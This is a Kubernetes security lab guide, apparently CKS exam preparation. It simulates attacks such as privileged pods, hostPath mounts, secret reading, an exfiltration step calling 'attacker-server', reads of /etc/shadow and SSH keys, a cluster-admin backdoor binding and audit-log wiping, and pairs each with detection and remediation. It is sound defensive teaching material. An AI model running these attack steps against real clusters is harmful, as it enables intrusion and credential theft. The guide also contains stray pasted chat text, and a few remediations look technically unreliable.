#  Detect Threats within Physical Infrastructure, Apps, Networks, Data, Users and Workloads

This lab is based on the CKS syllabus and the following references:

* Kubernetes Threat Modeling (Trend Micro)
* MITRE ATT&CK Threat Matrix for Kubernetes (Microsoft)

The goal of this lab is to learn **how to identify an attack, detect it, investigate it, mitigate it, and remediate it**.

---

# Lab Architecture

```
+------------------------------------------------------+
| Ubuntu VM                                            |
|                                                      |
|   +---------------------------+                      |
|   | Kubernetes Cluster        |                      |
|   | (kind / kubeadm / minikube)|                     |
|   +---------------------------+                      |
|                                                      |
|    kube-apiserver                                   |
|    etcd                                             |
|    kubelet                                          |
|    containerd                                       |
|                                                      |
|       +-------------+                               |
|       | Nginx Pod   |                               |
|       +-------------+                               |
|                                                      |
|       +-------------+                               |
|       | Busybox Pod | <-- attacker                  |
|       +-------------+                               |
|                                                      |
|              Falco                                  |
|              Audit Logs                             |
|              kubectl                                |
+------------------------------------------------------+
```

---

# Lab 1 — Detect Suspicious Pod Creation

## Threat

An attacker creates a privileged pod.

MITRE Mapping

```
Execution
Persistence
Privilege Escalation
```

---

## Step 1 Create Namespace

```bash
kubectl create ns production
```

---

## Step 2 Create Normal Application

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx
  namespace: production
  labels:
     owner: mitre

spec:
  replicas: 1

  selector:
    matchLabels:
      app: nginx

  template:
    metadata:
      labels:
        app: nginx
        owner: mitre

    spec:
      containers:

      - name: nginx
        image: nginx

```

Apply

```bash
kubectl apply -f nginx.yaml
```

Verify

```bash
kubectl get pods -n production
```

Output

```
nginx-xxxxx Running
```

---

## Step 3 Attacker Creates Privileged Pod

```yaml
apiVersion: v1
kind: Pod

metadata:
  name: hacker

spec:

  hostPID: true
  hostNetwork: true

  containers:

  - name: hacker

    image: busybox

    securityContext:
      privileged: true

    command:

    - sleep
    - "3600"
```

Apply

```bash
kubectl apply -f hacker.yaml
```

---

## Step 4 Detect

Check

```bash
kubectl get pod hacker -o yaml
```

Notice

```
privileged: true

hostPID: true

hostNetwork: true
```

These are indicators of privilege escalation.

---

## Step 5 Remediate

1. Delete the offending pod immediately:

```bash
kubectl delete pod hacker
```

2. Block privileged pods cluster-wide with a Kyverno policy (or Pod Security Admission):
 
 
The `ClusterPolicy` CRD (Custom Resource Definition) that defines this resource type doesn't exist yet. 
You can't create a `ClusterPolicy` object until the Kyverno controller and its CRDs are deployed.

**1. Confirm it's really not installed:**
```bash
kubectl get crd | grep kyverno
kubectl get ns | grep kyverno
```

**2. Install Kyverno (via Helm, the standard approach):**
```bash
helm repo add kyverno https://kyverno.github.io/kyverno/
helm repo update

helm install kyverno kyverno/kyverno -n kyverno --create-namespace
```

**3. Wait for it to be ready:**
```bash
kubectl wait --for=condition=Ready pods --all -n kyverno --timeout=120s
kubectl get pods -n kyverno
```

**4. Confirm the CRDs now exist:**
```bash
kubectl get crd | grep kyverno
```
You should see `clusterpolicies.kyverno.io` in the list among others.

**5. Now apply your policy:**

Create the cluster policy yaml file

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-privileged
spec:
  validationFailureAction: Enforce
  rules:
  - name: no-privileged
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Privileged containers are not allowed."
      pattern:
        spec:
          containers:
          - =(securityContext):
              =(privileged): "false"
```

```bash
kubectl apply -f clstrplc.yaml
kubectl get clusterpolicy
```

One thing worth flagging on the policy itself once it's applied — your pattern:
```yaml
=(securityContext):
  =(privileged): "false"
```
 
Verifiy the privileged pod using the following command

```bash
# should be blocked
kubectl run test-priv --image=nginx --overrides='{"spec":{"containers":[{"name":"test-priv","image":"nginx","securityContext":{"privileged":true}}]}}' --restart=Never

# should succeed
kubectl run test-safe --image=nginx --restart=Never
```
---

# Lab 2 — Detect HostPath Mount

## Threat

Attacker mounts host filesystem.

Example

```yaml
volumes:

- name: host

  hostPath:
    path: /
```

Container

```yaml
volumeMounts:

- mountPath: /host

  name: host
```

Apply

```bash
kubectl apply -f hostpath.yaml
```

Check

```bash
kubectl describe pod
```

Look for

```
HostPath
```

Risk

Attacker now has access to host filesystem.

## Remediate

1. Delete the pod:

```bash
kubectl delete pod <pod-name>
```

2. Enforce a policy denying `hostPath` volumes:

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-host-path
spec:
  validationFailureAction: Enforce
  rules:
  - name: host-path-block
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "hostPath volumes are not allowed."
      pattern:
        spec:
          =(volumes):
          - X(hostPath): "null"
```

3. Where host access is genuinely required, use a scoped, read-only mount and restrict via `AppArmor`/`SELinux` profiles instead of raw root mounts.
4. Audit the node filesystem for changes made during the exposure window.

---

# Lab 3 — Detect Secret Access

Create Secret

```bash
kubectl create secret generic db-password \
--from-literal=password=SuperSecret123
```

Attacker

```bash
kubectl get secrets
```

Then

```bash
kubectl describe secret db-password
```

or

```bash
kubectl get secret db-password \
-o jsonpath="{.data.password}" | base64 -d
```

Detection

Audit logs show

```
get secrets

list secrets

watch secrets
```

These operations should be monitored.

## Remediate

1. Rotate the exposed secret immediately:

```bash
kubectl delete secret db-password
kubectl create secret generic db-password \
  --from-literal=password=$(openssl rand -base64 24)
```

2. Restrict secret access with least-privilege RBAC (see Lab 4) instead of broad `get/list/watch` on `secrets`.
3. Enable encryption at rest for etcd (`EncryptionConfiguration`) so raw etcd access doesn't expose secret values.
4. Consider an external secrets manager (Vault, AWS Secrets Manager) with short-lived, injected credentials instead of static Kubernetes Secrets.

---

# Lab 4 — Detect ServiceAccount Abuse

Create Service Account

```bash
kubectl create sa developer
```

Check permissions

```bash
kubectl auth can-i list secrets \
--as=system:serviceaccount:default:developer
```

Suppose output

```
yes
```

This indicates excessive permissions.

Mitigation

Create least-privilege RBAC.

## Remediate

1. Identify the offending RoleBinding/ClusterRoleBinding:

```bash
kubectl get rolebindings,clusterrolebindings -A \
  -o json | jq '.items[] | select(.subjects[]?.name=="developer")'
```

2. Replace the overly broad role with a scoped one:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-reader
  namespace: default
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
```

3. Bind only what's needed:

```bash
kubectl create rolebinding developer-pod-reader \
  --role=pod-reader \
  --serviceaccount=default:developer
```

4. Disable auto-mounting of service account tokens where a pod doesn't need API access:

```yaml
spec:
  automountServiceAccountToken: false
```

5. Re-run `kubectl auth can-i` to confirm the permission is revoked.

---

# Lab 5 — Detect Network Reconnaissance

Attacker Pod

```bash
kubectl run attacker \
--image=busybox \
--restart=Never -it
```

Inside Pod

```sh
wget nginx

nslookup kubernetes.default

ping nginx

nc -zv nginx 80
```

Indicators

Lots of

```
DNS lookups

Port scans

Repeated connections
```

Detection

Network policy logs

Falco alerts

CNI logs

## Remediate

1. Delete the attacker pod:

```bash
kubectl delete pod attacker
```

2. Apply default-deny NetworkPolicies so pods can't reach each other unless explicitly allowed:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
```

3. Then allow only required traffic (e.g., nginx from a specific label):

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-nginx-from-frontend
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: nginx
  ingress:
  - from:
    - podSelector:
        matchLabels:
          role: frontend
```

4. Restrict who can run bare, interactive pods (`kubectl run ... -it`) via RBAC.

---

# Lab 6 — Detect Container Escape Attempt

Attacker Pod

```yaml
securityContext:

  privileged: true

hostPID: true

hostIPC: true
```

Inside

```bash
nsenter

chroot

mount
```

Detection

Falco alerts

```
Terminal shell in container

Mount filesystem

Write below root

Container escape attempt
```

## Remediate

1. Kill the pod and cordon/drain the node it ran on, since the host may be compromised:

```bash
kubectl delete pod <pod-name>
kubectl cordon <node-name>
kubectl drain <node-name> --ignore-daemonsets --delete-emptydir-data
```

2. Inspect the node for persistence (unexpected cron jobs, SSH keys, binaries) before returning it to the pool.
3. Enforce `privileged: false`, `hostPID: false`, `hostIPC: false` cluster-wide via Pod Security Admission (`restricted` profile) or Kyverno/OPA Gatekeeper.
4. Apply a restrictive seccomp/AppArmor profile to all workloads to block `nsenter`/`mount`-style syscalls even if a container is compromised.

---

# Lab 7 — Detect Data Exfiltration

Inside Pod

```bash
tar czf data.tar.gz /etc
```

Then

```bash
wget http://attacker-server/upload
```

Indicators

Large outbound traffic

Unexpected archive creation

Unexpected uploads

Detection

Network monitoring

Falco

IDS

## Remediate

1. Block the destination and terminate the pod:

```bash
kubectl delete pod <pod-name>
```

2. Add an egress NetworkPolicy that only permits traffic to known, approved endpoints (deny-by-default egress, as in Lab 5).
3. Deploy a Falco rule specifically for exfiltration patterns (archive creation followed by outbound connection) and route alerts to a SIEM for real-time response.
4. Rotate any credentials or data that may have been staged in the archive.

---

# Lab 8 — Detect Crypto Miner

Attacker

```bash
kubectl run miner \
--image=ubuntu
```

Install

```bash
apt update

apt install wget
```

Run

```bash
yes > /dev/null
```

Observe

```bash
kubectl top pod
```

Output

```
CPU 980m
```

Abnormal CPU usage.

## Remediate

1. Delete the workload:

```bash
kubectl delete pod miner
```

2. Set resource requests/limits on every workload so a single pod cannot consume the whole node:

```yaml
resources:
  requests:
    cpu: "100m"
    memory: "128Mi"
  limits:
    cpu: "500m"
    memory: "256Mi"
```

3. Enforce `LimitRange` and `ResourceQuota` at the namespace level to guarantee limits are always set.
4. Alert on sustained abnormal CPU via Prometheus + Alertmanager rather than relying on manual `kubectl top` checks.
5. Restrict which registries/images can be run (Lab 11) to reduce the chance of a miner image being deployed at all.

---

# Lab 9 — Detect Unauthorized kubectl Access

Check audit logs

```
kubectl get pods

kubectl delete deployment

kubectl create clusterrolebinding
```

Monitor

```
Delete

Patch

Exec

Port-forward

Proxy
```

## Remediate

1. Identify the identity behind the action from the audit log `user.username` field and disable/rotate their credentials if unauthorized:

```bash
kubectl delete clusterrolebinding <suspicious-binding>
```

2. Tighten RBAC so only specific principals can `create clusterrolebindings` (this is a common privilege-escalation path).
3. Enable and centrally ship Kubernetes audit logs to a SIEM with alerting on high-risk verbs (`delete`, `create clusterrolebinding`, `escalate`, `bind`, `impersonate`).
4. Require MFA and short-lived credentials for `kubectl` access (e.g., OIDC with a short token TTL) instead of long-lived static kubeconfigs.

---

# Lab 10 — Detect Suspicious Exec

Run

```bash
kubectl exec -it nginx -- sh
```

Detection

Audit logs

Falco

```
Terminal shell opened

Interactive session

Container shell detected
```

## Remediate

1. Restrict `pods/exec` via RBAC to only the roles/users that genuinely need debug access:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: no-exec
rules:
- apiGroups: [""]
  resources: ["pods/exec"]
  verbs: []
```

2. Use an admission controller (e.g., OPA Gatekeeper) to deny `exec` into production namespaces entirely, favoring ephemeral debug containers or ChatOps-audited break-glass access instead.
3. Alert in real time on `pods/exec` audit events for sensitive namespaces and require a follow-up justification/ticket.

---

# Lab 11 — Detect Image Pull from Untrusted Registry

Example

```yaml
image:

evil.registry.io/malware:latest
```

Detection

Admission Controller

OPA

Kyverno

ImagePolicyWebhook

## Remediate

1. Delete the offending workload:

```bash
kubectl delete pod <pod-name>
```

2. Enforce an allow-list of trusted registries with Kyverno:

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: restrict-image-registries
spec:
  validationFailureAction: Enforce
  rules:
  - name: allowed-registries
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Only images from trusted-registry.io are allowed."
      pattern:
        spec:
          containers:
          - image: "trusted-registry.io/*"
```

3. Require image signing and verification (Sigstore/Cosign) so only signed, provenance-verified images can run.
4. Scan images for vulnerabilities and malware pre-deployment (Trivy) as part of CI, not just at admission time.

---

# Lab 12 — Detect Sensitive File Access

Inside Container

```bash
cat /etc/shadow
```

or

```bash
cat /root/.ssh/id_rsa
```

Detection

Falco Rule

```
Read sensitive file
```

## Remediate

1. Terminate the pod and rotate any credentials/keys stored in the accessed files (e.g., re-issue SSH keys):

```bash
kubectl delete pod <pod-name>
```

2. Run containers as non-root with a read-only root filesystem so sensitive host files aren't reachable or writable:

```yaml
securityContext:
  runAsNonRoot: true
  readOnlyRootFilesystem: true
```

3. Avoid mounting host paths or secrets as plain files where not strictly necessary; prefer environment injection from a secrets manager with short-lived tokens.
4. Add a Falco custom rule to page the on-call team the moment `/etc/shadow` or SSH private keys are read inside any container.

---

# Lab 13 — Detect RBAC Wildcard / Cluster-Admin Grant

## Threat

An attacker (or a careless deploy script) grants themselves `cluster-admin`, or a role uses wildcard verbs/resources.

MITRE Mapping

```
Privilege Escalation
Persistence
```

## Step 1 Attacker Escalates Privileges

```bash
kubectl create clusterrolebinding backdoor \
  --clusterrole=cluster-admin \
  --serviceaccount=default:developer
```

## Step 2 Detect

```bash
kubectl get clusterrolebindings -o json \
  | jq '.items[] | select(.roleRef.name=="cluster-admin")'
```

Also search audit logs for:

```
verb: create
resource: clusterrolebindings
roleRef.name: cluster-admin
```

Look for any Role/ClusterRole using wildcards:

```bash
kubectl get clusterroles -o json \
  | jq '.items[] | select(.rules[]?.resources[]? == "*")'
```

## Remediate

1. Delete the unauthorized binding:

```bash
kubectl delete clusterrolebinding backdoor
```

2. Ban wildcard `*` in `resources`/`verbs` for custom roles via an OPA/Kyverno policy that validates RBAC objects at admission time.
3. Restrict who can create `clusterrolebindings`/`rolebindings` for `cluster-admin` — this verb itself should require a break-glass approval workflow.
4. Periodically run an RBAC audit tool (e.g., `kubectl-who-can`, `rbac-lookup`) to catch privilege creep.

---

# Lab 14 — Detect Anonymous / Unauthenticated API Access

## Threat

The `system:anonymous` user or `system:unauthenticated` group is granted access, allowing unauthenticated callers to hit the API server.

MITRE Mapping

```
Initial Access
```

## Step 1 Simulate

```bash
curl -k https://<api-server>:6443/api/v1/namespaces \
  --insecure
```

If this returns data without credentials, anonymous access is enabled and over-permissioned.

## Step 2 Detect

```bash
kubectl get clusterrolebindings -o json \
  | jq '.items[] | select(.subjects[]?.name=="system:anonymous" or .subjects[]?.name=="system:unauthenticated")'
```

Check the API server flag:

```bash
ps -ef | grep kube-apiserver | grep anonymous-auth
```

## Remediate

1. Disable anonymous auth on the API server:

```
--anonymous-auth=false
```

2. Remove any bindings granting `system:anonymous` or `system:unauthenticated` roles beyond the bare minimum (e.g., health checks only).
3. Require mTLS or OIDC for all API server access and monitor for repeated `401`/`403` responses as a reconnaissance signal.

---

# Lab 15 — Detect Audit Log Tampering / Disabled Logging

## Threat

An attacker with node or control-plane access disables or wipes audit logging to hide their tracks.

MITRE Mapping

```
Defense Evasion
```

## Step 1 Simulate

```bash
# On the control-plane node
mv /etc/kubernetes/audit-policy.yaml /etc/kubernetes/audit-policy.yaml.bak
systemctl restart kubelet
```

or truncate existing logs:

```bash
> /var/log/kubernetes/audit.log
```

## Step 2 Detect

* Ship audit logs to a remote, append-only store (e.g., a SIEM or object storage with write-once policies) so local tampering doesn't erase evidence.
* Alert if the audit log file's size unexpectedly drops to zero or stops growing.
* Monitor `kube-apiserver` process restarts and flag changes to `--audit-log-path`, `--audit-policy-file`, or `--audit-webhook-config-file`.
* File Integrity Monitoring (FIM) on `/etc/kubernetes/audit-policy.yaml` and the audit log path.

## Remediate

1. Restore the audit policy file and restart the API server:

```bash
mv /etc/kubernetes/audit-policy.yaml.bak /etc/kubernetes/audit-policy.yaml
systemctl restart kubelet
```

2. Configure remote, tamper-resistant log shipping (Fluentd/Fluent Bit → SIEM) so logs survive local tampering.
3. Restrict node/SSH access to control-plane hosts and require just-in-time, audited access for anyone who can touch `/etc/kubernetes`.
4. Treat any gap in audit log continuity as a security incident requiring full investigation of the surrounding time window.

---

# Mapping to MITRE Kubernetes Threat Matrix

| Threat                        | MITRE Technique      | Detection Method            | Primary Remediation                    |
| ------------------------------ | --------------------- | ---------------------------- | ---------------------------------------- |
| Privileged Pod                 | Privilege Escalation  | Audit Logs, Falco            | Pod Security Admission / Kyverno         |
| HostPath Mount                 | Host Access           | Admission Controller, Falco  | Deny hostPath policy                     |
| Secret Access                  | Credential Access     | Audit Logs                   | Rotate secret, least-privilege RBAC      |
| ServiceAccount Abuse           | Credential Access     | RBAC Review                  | Scoped Role + disable automount          |
| Network Scan                   | Discovery              | NetworkPolicy, Falco         | Default-deny NetworkPolicy               |
| Container Escape               | Escape to Host        | Falco                        | Cordon/drain node, restricted profile    |
| Data Exfiltration              | Exfiltration           | IDS, Network Monitoring      | Egress NetworkPolicy, rotate creds       |
| Crypto Miner                   | Resource Hijacking     | Metrics Server, Prometheus   | Resource limits/quotas                   |
| Unauthorized kubectl           | Persistence             | Audit Logs                   | Tighten RBAC, rotate credentials         |
| Interactive Shell               | Execution                | Falco                        | Restrict `pods/exec` RBAC                |
| Malicious Image                | Initial Access          | ImagePolicyWebhook, Kyverno  | Registry allow-list, image signing       |
| Sensitive File Read             | Collection               | Falco                        | Non-root, read-only FS, rotate secrets   |
| RBAC Wildcard / cluster-admin   | Privilege Escalation    | Audit Logs, RBAC audit tools | Delete binding, ban wildcards            |
| Anonymous API Access            | Initial Access          | API server flags, RBAC       | Disable anonymous-auth                   |
| Audit Log Tampering             | Defense Evasion         | FIM, remote log shipping     | Remote append-only logging               |

---

# CKS Exam Detection Checklist

| Asset                   | What to Detect                                                   | Tool                          |
| ------------------------ | ------------------------------------------------------------------ | ------------------------------- |
| Physical Infrastructure | Node compromise, unusual processes                                | Falco, OS logs                 |
| Applications             | Vulnerable images, unexpected shells                              | Falco, Trivy                   |
| Networks                 | Port scans, DNS enumeration, exfiltration                         | NetworkPolicy, Cilium, Calico  |
| Data                     | Secret access, file reads, data exfiltration                      | Audit Logs, Falco              |
| Users                    | Unauthorized RBAC actions, `kubectl exec`, privilege escalation   | Kubernetes Audit Logs          |
| Workloads                 | Privileged pods, HostPath mounts, host networking, excessive CPU | Falco, Metrics Server          |
| Control Plane            | Audit log tampering, anonymous access, RBAC wildcards             | FIM, API server flags, RBAC review |

---

# Tools Recommended for CKS

* **Falco (CNCF):** Runtime detection of suspicious syscalls, container escapes, privileged containers, and file access.
* **Kubernetes Audit Logs:** Detect API actions such as `exec`, `create`, `delete`, `patch`, and secret access.
* **Metrics Server / Prometheus:** Monitor abnormal CPU and memory usage (for example, cryptomining).
* **Network Policies (Calico/Cilium):** Restrict east-west traffic and help identify unauthorized communication.
* **Kyverno / OPA Gatekeeper:** Prevent risky configurations such as privileged pods, `hostPath` volumes, or wildcard RBAC before they are deployed.
* **Trivy / Cosign:** Scan images for vulnerabilities and verify image signatures before they're allowed to run.
* **kubectl-who-can / rbac-lookup:** Periodically audit RBAC for privilege creep and wildcard grants.

---

# General Incident Response Workflow

Use this sequence for any of the labs above once a threat is confirmed:

1. **Contain** — delete/cordon the offending pod, node, or credential.
2. **Preserve evidence** — capture `kubectl describe`, audit log excerpts, and Falco alerts before cleanup.
3. **Eradicate** — rotate secrets/tokens, remove backdoor bindings, rebuild affected images/nodes.
4. **Recover** — redeploy clean workloads, re-enable traffic gradually, verify NetworkPolicy/RBAC are correctly scoped.
5. **Lessons learned** — turn the detection into a permanent Falco rule, Kyverno policy, or alert so the same technique is blocked/caught automatically next time.

These labs closely align with the threat modeling guidance from Trend Micro and the MITRE ATT&CK Matrix for Kubernetes, covering common attack paths, the runtime detection techniques, and the remediation steps expected for the CKS exam.
